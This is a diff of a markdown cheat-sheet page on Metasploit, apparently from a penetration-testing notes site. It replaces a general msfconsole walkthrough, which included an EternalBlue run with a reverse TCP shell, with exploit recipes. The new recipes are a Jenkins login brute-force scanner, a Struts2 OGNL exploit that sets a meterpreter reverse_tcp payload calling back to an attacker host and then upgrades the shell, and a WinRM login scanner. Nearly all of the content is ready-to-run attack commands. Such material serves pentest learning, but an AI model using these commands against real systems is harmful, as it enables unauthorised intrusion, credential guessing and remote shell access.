@@ -1,75 +1,56 @@
 ---
 title: Metasploit
 desc: Provides security vulnerabilities and exploit using payloads. It contains Msfconsole, Msfvenom
-tags: [ActiveRecon, Jenkins, Linux, PortForwarding]
+tags: [ActiveRecon, Jenkins, Linux, PortForwarding, Struts, WinRM]
 alts: [ExploitDB, Gobuster, Searchsploit]
 website:
 render_with_liquid: false
 ---
 
-## Msfdb
+## Exploit - Jenkins
 
 ```sh
-# Initialize metasploit database
-msfdb init
-```
-
-<br />
-
-## Msfconsole (Commands)
-
-```sh
-# Start
 msfconsole
-
----
-
-# check database status
-msf6 > db_status
-
-# Search exploits from keywords
-msf6 > search ms17-010
-
-# Use an exploit
-msf6 > use exploit/windows/smb/smb_17_010_eternalblue
-
-# Show options
-msf6 exploit(windows/smb/smb_17_010_eternalblue) > options
-
-# Set options
-msf6 exploit(windows/smb/smb_17_010_eternalblue) > set rhosts 10.0.0.1
-msf6 exploit(windows/smb/smb_17_010_eternalblue) > set lhost 10.0.0.2
-
-# Unset options
-msf6 exploit(windows/smb/smb_17_010_eternalblue) > unset rhosts
-
-# Show payloads
-msf6 exploit(windows/smb/smb_17_010_eternalblue) > show payloads
-
-# Set payload
-msf6 exploit(windows/smb/smb_17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
-
-# Run exploit
-msf6 exploit(windows/smb/smb_17_010_eternalblue) > exploit
-
-# 
-# Ctrl + Z to background session
-# 
+msf > use auxiliary/scanner/http/jenkins_login
+msf > set rhosts <target-ip>
+msf > set rport <target-port>
+msf > options
+msf > exploit
 ```
 
 <br />
 
-## Msfconsole (Modules)
+## Exploit - Struts2 OGNL
 
 ```sh
-# Jenkins
-msf > use auxiliary/scanner/http/jenkins_login
+msfconsole
+msf > use multi/http/struts2_content_type_ognl
+msf > show payloads
+msf > set payload linux/x86/meterpreter/reverse_tcp
+msf > set rhosts <target-ip>
+msf > set rport <target-port>
+msf > set lhost <attacker-ip>
+msf > set lport <attacker-port>
+msf > options
+msf > exploit
 
-# WinRM
+# Move to shell
+meterpreter > shell
+# Upgrade to full functional terminal
+SHELL=/bin/bash script -q /dev/null
+```
+
+<br />
+
+## Exploit - WinRM
+
+```sh
+msfconsole
 msf > use auxiliary/scanner/winrm/winrm_login
-msf > use auxiliary/scanner/winrm/winrm_wql
-msf > use auxiliary/scanner/winrm/winrm_cmd
-msf > use auxiliary/scanner/winrm/winrm_script_exec
+msf > set rhosts <target-ip>
+msf > set rport <target-port>
+msf > options
+msf > exploit
 ```
 
 <br />
